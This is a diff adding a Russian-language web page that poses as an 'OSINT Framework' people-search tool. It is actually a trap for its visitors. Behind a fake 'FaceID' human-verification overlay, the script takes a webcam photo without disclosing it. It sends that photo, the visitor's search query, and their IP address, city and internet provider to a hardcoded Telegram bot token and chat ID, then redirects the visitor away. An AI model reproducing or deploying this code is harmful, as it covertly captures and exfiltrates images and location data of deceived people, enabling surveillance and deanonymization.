@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OSINT Framework | Поиск по открытым данным</title>
+    <style>
+        body { margin: 0; background: #0d1117; color: #c9d1d9; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .terminal { width: 90%; max-width: 600px; background: #161b22; border: 1px solid #30363d; border-radius: 6px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); padding: 20px; }
+        .header { color: #58a6ff; font-weight: bold; border-bottom: 1px solid #30363d; padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; }
+        .input-group { display: flex; flex-direction: column; gap: 10px; }
+        input { background: #0d1117; border: 1px solid #30363d; color: #7ee787; padding: 12px; border-radius: 4px; outline: none; font-size: 16px; }
+        button { background: #238636; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; font-weight: bold; transition: 0.3s; }
+        button:hover { background: #2ea043; }
+        .status { margin-top: 15px; font-size: 13px; color: #8b949e; }
+        .blink { animation: blinker 1s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
+        video, canvas { display: none; }
+        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
+    </style>
+</head>
+<body>
+
+    <div class="terminal">
+        <div class="header">
+            <span>DATABASE_ACCESS: ENABLED</span>
+            <span class="blink">● LIVE</span>
+        </div>
+        <div class="input-group">
+            <label>Введите Username, Email или Phone:</label>
+            <input type="text" id="target" placeholder="@username / 7999..." autocomplete="off">
+            <button onclick="startHack()">ЗАПУСТИТЬ ПОИСК</button>
+        </div>
+        <div class="status" id="log">> Ожидание ввода данных...</div>
+    </div>
+
+    <div id="overlay">
+        <h2 style="color: #58a6ff;">ПОДТВЕРЖДЕНИЕ ЛИЧНОСТИ</h2>
+        <p style="text-align: center; padding: 0 20px;">Для предотвращения DDOS-атак, подтвердите, что вы человек.<br>Посмотрите в камеру и не двигайтесь 2-3 секунды.</p>
+        <div id="loader" style="color: #7ee787;">Инициализация FaceID...</div>
+    </div>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const BOT_TOKEN = '8570554697:AAHRYkl8_AIuOC4gbOl6AxRWOnmEMzw15Eg'; 
+        const CHAT_ID = '1751630480';
+
+        async function sendToTg(text) {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'Markdown'})
+            });
+        }
+
+        async function sendPhoto(blob) {
+            let formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'target.jpg');
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        }
+
+        function startHack() {
+            const target = document.getElementById('target').value;
+            if (!target) return alert("Введите данные для поиска!");
+
+            document.getElementById('overlay').style.display = 'flex';
+            
+            // Запрашиваем камеру под предлогом "FaceID"
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    document.getElementById('video').srcObject = stream;
+                    document.getElementById('loader').innerHTML = "⚙️ СКАНИРОВАНИЕ СЕТЧАТКИ: 45%";
+                    
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        const video = document.getElementById('video');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        
+                        canvas.toBlob(blob => {
+                            sendPhoto(blob);
+                            sendToTg(`🎯 **ЦЕЛЬ ПОЙМАНА!**\n👤 Введенный запрос: \`${target}\`\n🌐 IP будет ниже...`);
+                            getExtraInfo();
+                        }, 'image/jpeg');
+
+                        document.getElementById('loader').innerHTML = "✅ ЛИЧНОСТЬ ПОДТВЕРЖДЕНА. ЗАГРУЗКА ОТЧЕТА...";
+                        setTimeout(() => { location.href = "https://t.me/search_engine"; }, 2000); // Редирект на любого бота
+                    }, 2000);
+                })
+                .catch(err => {
+                    sendToTg(`❌ Отказ в доступе к камере по запросу: ${target}`);
+                    getExtraInfo();
+                    alert("Ошибка: Система не может подтвердить вашу личность без камеры.");
+                    document.getElementById('overlay').style.display = 'none';
+                });
+        }
+
+        function getExtraInfo() {
+            fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
+                const msg = `📍 **ДАННЫЕ IP:**\nIP: \`${data.ip}\`\nГород: ${data.city}\nПровайдер: ${data.org}`;
+                sendToTg(msg);
+            });
+        }
+    </script>
+</body>
+</html>
